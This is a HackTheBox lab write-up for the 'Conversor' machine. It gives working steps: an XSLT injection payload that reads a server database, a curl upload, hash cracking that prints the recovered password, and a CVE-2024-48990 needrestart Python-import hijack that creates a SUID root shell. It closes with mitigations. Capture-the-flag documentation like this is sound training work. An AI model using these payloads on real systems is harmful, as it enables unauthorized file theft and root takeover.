@@ -1,0 +1,231 @@
+HackTheBox - Conversor  
+Easy Linux Machine • HTB Season 9 • Released October 25, 2025  
+Date: December 13, 2025  
+Difficulty: Easy  
+OS: Linux  
+Points: 20  
+Skills Demonstrated: Web application exploitation, XML/XSLT injection, credential cracking, sudo privilege escalation, Python import hijacking, clean enumeration & documentation  
+Overview
+Conversor is an easy-rated Linux machine that simulates a currency-converter web application vulnerable to XSLT injection (via unsecured lxml.etree.XSLT with EXSLT extensions). After obtaining a foothold as www-data and cracking credentials to pivot to fismathack, the box is rooted by abusing CVE-2024-48990 (needrestart 3.7) via a pure-Python importlib hijack under a NOPASSWD sudo rule.
+
+Attack Chain Summary:
+
+Recon & Foothold → XSLT injection (EXSLT:document) on /convert  
+
+User → MD5 hash extraction → rockyou crack → SSH as fismathack  
+
+Root → sudo needrestart → PYTHONPATH hijack with malicious __init__.py → SUID root shell  
+
+Enumeration
+
+# Add host
+
+echo "10.10.11.XX conversor.htb" | sudo tee -a /etc/hosts
+
+
+# Nmap
+
+nmap -sC -sV -p- 10.10.11.XX
+
+# → 22/tcp open ssh, 80/tcp open http (Apache)
+
+  
+
+# Directory brute
+
+dirb http://conversor.htb/ /usr/share/wordlists/dirbuster/big.txt
+
+# → /convert discovered (POST XML + XSLT upload)
+
+Foothold – XSLT Injection (XXE / File Read + Write)
+Authenticated upload endpoint /convert processes user-supplied XSLT with EXSLT extensions enabled.
+
+Read payload (read.xslt):
+
+
+<?xml version="1.0"?>
+
+<xsl:stylesheet version="1.0"
+
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+
+    xmlns:exsl="http://exslt.org/common"
+
+    extension-element-prefixes="exsl">
+
+  <xsl:template match="/">
+
+    <exsl:document href="/tmp/db.dump" method="text">
+
+      <xsl:copy-of select="document('/var/www/conversor.htb/instance/users.db')"/>
+
+    </exsl:document>
+
+  </xsl:template>
+
+</xsl:stylesheet>
+
+Curl upload (with valid session= cookie):
+
+
+curl -X POST http://conversor.htb/convert \
+
+  -F "xml_file=@sample.xml" \
+
+  -F "xslt_file=@read.xslt" \
+
+  -b "session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3QifQ..."
+
+Extracted SQLite DB → MD5 hash 5b5c3ac3a1c897c94caad48e6c71fdec.
+
+Crack:
+
+
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# → Keepmesafeandwarm
+
+Alternative RCE path (used for direct shell):
+
+Wrote revshell.py via EXSLT:document to /var/www/conversor.htb/scripts/ (executed every 60s by cron as www-data).
+User Flag
+
+ssh fismathack@10.10.11.XX
+
+# Password: Keepmesafeandwarm
+
+  
+
+cat user.txt
+
+# htb{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
+
+Privilege Escalation – CVE-2024-48990 (needrestart 3.7)
+sudo -l revealed:
+
+
+(fismathack) NOPASSWD: /usr/sbin/needrestart
+
+Pure Python importlib hijack (chosen after .so transfer issues):
+
+
+# On target
+
+mkdir -p /tmp/malicious/importlib
+
+  
+
+cat > /tmp/malicious/importlib/__init__.py << EOF
+
+import os
+
+os.setuid(0)
+
+os.setgid(0)
+
+os.system("cp /bin/bash /tmp/poc && chmod 4755 /tmp/poc")
+
+EOF
+
+  
+
+cat > /tmp/malicious/bait.py << EOF
+
+import time
+
+while True:
+
+    time.sleep(1)
+
+EOF
+
+  
+
+cd /tmp/malicious
+
+PYTHONPATH=/tmp/malicious python3 bait.py &
+
+sudo needrestart
+
+After ~15 seconds:
+
+
+ls -l /tmp/poc
+
+# -rwsr-xr-x 1 root root 1396520 Dec 13 01:05 /tmp/poc
+
+Root shell:
+
+
+/tmp/poc -p
+
+whoami   # root
+
+cat /root/root.txt
+
+# htb{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
+
+Lessons Learned & Mitigations:
+Web layer: Disable EXSLT extensions (XSLTAccessControl) and external entity processing in libxml2/lxml.
+
+Credential hygiene: Never ship MD5 hashes in production databases.
+
+Sudo hygiene: Avoid NOPASSWD on system utilities; enforce Defaults env_reset.
+
+Dependency patching: needrestart ≥ 3.8 mitigates CVE-2024-48990.
+
+Lab takeaway: Pure-Python __init__.py is more reliable than compiled .so for import hijacks when transfer/architecture issues arise.
+
+Tools Used:
+nmap, dirb / gobuster
+
+Burp Suite (for cookie/session handling)
+
+curl, hashcat / john
+
+Custom XSLT payloads (PayloadsAllTheThings reference)
+
+Python scripting for bait & importlib hijack
+
+Repository Structure (for GitHub)
+
+
+HTB-Conversor-Writeup/
+
+├── README.md
+
+├── screenshots/
+
+│   ├── nmap.png
+
+│   ├── xslt-payload.png
+
+│   ├── sudo-l.png
+
+│   └── root-flag.png
+
+├── payloads/
+
+│   ├── read.xslt
+
+│   ├── write.xslt
+
+│   └── __init__.py
+
+└── scripts/
+
+    └── bait.py
+
+Proof of Ownership:
+
+(Flags redacted for public repo – available upon request in private repo)
+
+Skills Demonstrated:
+
+Advanced web application exploitation (XSLT injection)  
+
+Credential harvesting & offline cracking  
+
+Linux privilege escalation via environment variable hijacking (CVE-2024-48990)  
+
+Clean documentation & reproducible steps  
